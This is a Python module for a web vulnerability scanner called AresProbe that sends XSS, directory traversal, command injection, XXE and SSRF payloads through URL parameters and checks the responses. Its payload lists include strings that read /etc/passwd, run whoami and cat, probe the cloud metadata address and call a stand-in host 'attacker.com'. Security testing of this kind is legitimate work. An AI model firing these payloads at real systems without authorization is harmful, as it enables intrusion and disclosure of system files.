"""
AresProbe Vulnerability Scanner
Advanced web vulnerability scanner with multiple attack vectors
"""

import re
import time
import random
import string
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse, parse_qs, urlencode
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from .logger import Logger


class VulnerabilityType:
    """Types of vulnerabilities to scan for"""
    XSS = "xss"
    CSRF = "csrf"
    DIRECTORY_TRAVERSAL = "directory_traversal"
    COMMAND_INJECTION = "command_injection"
    XXE = "xxe"
    SSRF = "ssrf"
    FILE_UPLOAD = "file_upload"
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"


class Vulnerability:
    """Represents a found vulnerability"""
    
    def __init__(self, vuln_type: str, parameter: str, payload: str, 
                 description: str, severity: str = "medium"):
        self.vuln_type = vuln_type
        self.parameter = parameter
        self.payload = payload
        self.description = description
        self.severity = severity
        self.confidence = 0.0
        self.response = None
        self.timestamp = time.time()


class VulnerabilityScanner:
    """
    Advanced web vulnerability scanner
    """
    
    def __init__(self, logger: Logger = None):
        self.logger = logger or Logger()
        self.session = requests.Session()
        self.vulnerabilities = []
        
        # Configure session
        retry_strategy = Retry(total=3, backoff_factor=1)
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def scan_xss(self, target_url: str, config) -> Dict[str, Any]:
        """Scan for Cross-Site Scripting (XSS) vulnerabilities"""
        self.logger.info(f"[*] Scanning for XSS vulnerabilities on {target_url}")
        
        results = {
            'target': target_url,
            'vulnerabilities': [],
            'scan_time': 0,
            'total_tests': 0
        }
        
        start_time = time.time()
        
        try:
            parsed_url = urlparse(target_url)
            params = parse_qs(parsed_url.query)
            
            if not params:
                return results
            
            # XSS payloads
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "</script><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>"
            ]
            
            for param_name, param_values in params.items():
                for param_value in param_values:
                    for payload in xss_payloads:
                        results['total_tests'] += 1
                        
                        test_url = self._build_test_url(target_url, param_name, param_value + payload)
                        response = self._send_request(test_url, config)
                        
                        if self._detect_xss(response, payload):
                            vuln = Vulnerability(
                                VulnerabilityType.XSS,
                                param_name,
                                payload,
                                f"XSS vulnerability found in parameter '{param_name}'",
                                "high"
                            )
                            vuln.response = response
                            vuln.confidence = 0.9
                            results['vulnerabilities'].append(vuln.__dict__)
                            
                            self.logger.success(f"[+] XSS vulnerability found in parameter '{param_name}'")
            
            results['scan_time'] = time.time() - start_time
            
        except Exception as e:
            self.logger.error(f"[-] XSS scan failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def scan_directory_traversal(self, target_url: str, config) -> Dict[str, Any]:
        """Scan for directory traversal vulnerabilities"""
        self.logger.info(f"[*] Scanning for directory traversal vulnerabilities on {target_url}")
        
        results = {
            'target': target_url,
            'vulnerabilities': [],
            'scan_time': 0,
            'total_tests': 0
        }
        
        start_time = time.time()
        
        try:
            # Directory traversal payloads
            traversal_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
            ]
            
            parsed_url = urlparse(target_url)
            params = parse_qs(parsed_url.query)
            
            for param_name, param_values in params.items():
                for param_value in param_values:
                    for payload in traversal_payloads:
                        results['total_tests'] += 1
                        
                        test_url = self._build_test_url(target_url, param_name, payload)
                        response = self._send_request(test_url, config)
                        
                        if self._detect_directory_traversal(response):
                            vuln = Vulnerability(
                                VulnerabilityType.DIRECTORY_TRAVERSAL,
                                param_name,
                                payload,
                                f"Directory traversal vulnerability found in parameter '{param_name}'",
                                "high"
                            )
                            vuln.response = response
                            vuln.confidence = 0.8
                            results['vulnerabilities'].append(vuln.__dict__)
                            
                            self.logger.success(f"[+] Directory traversal vulnerability found in parameter '{param_name}'")
            
            results['scan_time'] = time.time() - start_time
            
        except Exception as e:
            self.logger.error(f"[-] Directory traversal scan failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def scan_command_injection(self, target_url: str, config) -> Dict[str, Any]:
        """Scan for command injection vulnerabilities"""
        self.logger.info(f"[*] Scanning for command injection vulnerabilities on {target_url}")
        
        results = {
            'target': target_url,
            'vulnerabilities': [],
            'scan_time': 0,
            'total_tests': 0
        }
        
        start_time = time.time()
        
        try:
            # Command injection payloads
            command_payloads = [
                "; ls",
                "| whoami",
                "& id",
                "` whoami `",
                "$(whoami)",
                "; cat /etc/passwd",
                "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "& dir",
                "; ping -c 1 127.0.0.1",
                "| ping -n 1 127.0.0.1"
            ]
            
            parsed_url = urlparse(target_url)
            params = parse_qs(parsed_url.query)
            
            for param_name, param_values in params.items():
                for param_value in param_values:
                    for payload in command_payloads:
                        results['total_tests'] += 1
                        
                        test_url = self._build_test_url(target_url, param_name, param_value + payload)
                        response = self._send_request(test_url, config)
                        
                        if self._detect_command_injection(response, payload):
                            vuln = Vulnerability(
                                VulnerabilityType.COMMAND_INJECTION,
                                param_name,
                                payload,
                                f"Command injection vulnerability found in parameter '{param_name}'",
                                "critical"
                            )
                            vuln.response = response
                            vuln.confidence = 0.7
                            results['vulnerabilities'].append(vuln.__dict__)
                            
                            self.logger.success(f"[+] Command injection vulnerability found in parameter '{param_name}'")
            
            results['scan_time'] = time.time() - start_time
            
        except Exception as e:
            self.logger.error(f"[-] Command injection scan failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def scan_xxe(self, target_url: str, config) -> Dict[str, Any]:
        """Scan for XXE (XML External Entity) vulnerabilities"""
        self.logger.info(f"[*] Scanning for XXE vulnerabilities on {target_url}")
        
        results = {
            'target': target_url,
            'vulnerabilities': [],
            'scan_time': 0,
            'total_tests': 0
        }
        
        start_time = time.time()
        
        try:
            # XXE payloads
            xxe_payloads = [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>'
            ]
            
            # Test XXE in various parameters
            parsed_url = urlparse(target_url)
            params = parse_qs(parsed_url.query)
            
            for param_name, param_values in params.items():
                for param_value in param_values:
                    for payload in xxe_payloads:
                        results['total_tests'] += 1
                        
                        test_url = self._build_test_url(target_url, param_name, payload)
                        response = self._send_request(test_url, config)
                        
                        if self._detect_xxe(response):
                            vuln = Vulnerability(
                                VulnerabilityType.XXE,
                                param_name,
                                payload,
                                f"XXE vulnerability found in parameter '{param_name}'",
                                "high"
                            )
                            vuln.response = response
                            vuln.confidence = 0.8
                            results['vulnerabilities'].append(vuln.__dict__)
                            
                            self.logger.success(f"[+] XXE vulnerability found in parameter '{param_name}'")
            
            results['scan_time'] = time.time() - start_time
            
        except Exception as e:
            self.logger.error(f"[-] XXE scan failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def scan_ssrf(self, target_url: str, config) -> Dict[str, Any]:
        """Scan for SSRF (Server-Side Request Forgery) vulnerabilities"""
        self.logger.info(f"[*] Scanning for SSRF vulnerabilities on {target_url}")
        
        results = {
            'target': target_url,
            'vulnerabilities': [],
            'scan_time': 0,
            'total_tests': 0
        }
        
        start_time = time.time()
        
        try:
            # SSRF payloads
            ssrf_payloads = [
                "http://127.0.0.1:22",
                "http://localhost:22",
                "http://169.254.169.254/",
                "http://0.0.0.0:22",
                "file:///etc/passwd",
                "gopher://127.0.0.1:22",
                "dict://127.0.0.1:22"
            ]
            
            parsed_url = urlparse(target_url)
            params = parse_qs(parsed_url.query)
            
            for param_name, param_values in params.items():
                for param_value in param_values:
                    for payload in ssrf_payloads:
                        results['total_tests'] += 1
                        
                        test_url = self._build_test_url(target_url, param_name, payload)
                        response = self._send_request(test_url, config)
                        
                        if self._detect_ssrf(response, payload):
                            vuln = Vulnerability(
                                VulnerabilityType.SSRF,
                                param_name,
                                payload,
                                f"SSRF vulnerability found in parameter '{param_name}'",
                                "high"
                            )
                            vuln.response = response
                            vuln.confidence = 0.7
                            results['vulnerabilities'].append(vuln.__dict__)
                            
                            self.logger.success(f"[+] SSRF vulnerability found in parameter '{param_name}'")
            
            results['scan_time'] = time.time() - start_time
            
        except Exception as e:
            self.logger.error(f"[-] SSRF scan failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def _build_test_url(self, target_url: str, param_name: str, param_value: str) -> str:
        """Build test URL with modified parameter"""
        parsed_url = urlparse(target_url)
        params = parse_qs(parsed_url.query)
        params[param_name] = [param_value]
        
        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        test_url += "?" + urlencode(params, doseq=True)
        
        return test_url
    
    def _send_request(self, url: str, config) -> requests.Response:
        """Send HTTP request with configuration"""
        return self.session.get(
            url,
            headers=config.headers or {},
            cookies=config.cookies or {},
            auth=config.auth,
            timeout=config.timeout,
            verify=config.verify_ssl
        )
    
    def _detect_xss(self, response: requests.Response, payload: str) -> bool:
        """Detect XSS vulnerability in response"""
        if response.status_code == 200:
            # Check if payload is reflected in response
            if payload in response.text:
                return True
            
            # Check for common XSS patterns
            xss_patterns = [
                r"<script[^>]*>.*?</script>",
                r"javascript:",
                r"on\w+\s*=",
                r"<iframe[^>]*>",
                r"<img[^>]*onerror",
                r"<svg[^>]*onload"
            ]
            
            for pattern in xss_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True
        
        return False
    
    def _detect_directory_traversal(self, response: requests.Response) -> bool:
        """Detect directory traversal vulnerability in response"""
        if response.status_code == 200:
            # Check for common file contents
            file_indicators = [
                "root:x:0:0:",
                "bin/bash",
                "localhost",
                "127.0.0.1",
                "Microsoft Windows",
                "Windows NT"
            ]
            
            for indicator in file_indicators:
                if indicator in response.text:
                    return True
        
        return False
    
    def _detect_command_injection(self, response: requests.Response, payload: str) -> bool:
        """Detect command injection vulnerability in response"""
        if response.status_code == 200:
            # Check for command output patterns
            command_patterns = [
                r"uid=\d+.*gid=\d+",
                r"total \d+",
                r"Directory of",
                r"Volume in drive",
                r"PING.*127\.0\.0\.1"
            ]
            
            for pattern in command_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True
        
        return False
    
    def _detect_xxe(self, response: requests.Response) -> bool:
        """Detect XXE vulnerability in response"""
        if response.status_code == 200:
            # Check for file contents or external entity responses
            xxe_indicators = [
                "root:x:0:0:",
                "bin/bash",
                "localhost",
                "127.0.0.1"
            ]
            
            for indicator in xxe_indicators:
                if indicator in response.text:
                    return True
        
        return False
    
    def _detect_ssrf(self, response: requests.Response, payload: str) -> bool:
        """Detect SSRF vulnerability in response"""
        if response.status_code == 200:
            # Check for internal service responses
            ssrf_indicators = [
                "SSH-2.0",
                "HTTP/1.1 200 OK",
                "root:x:0:0:",
                "localhost",
                "127.0.0.1"
            ]
            
            for indicator in ssrf_indicators:
                if indicator in response.text:
                    return True
        
        return False
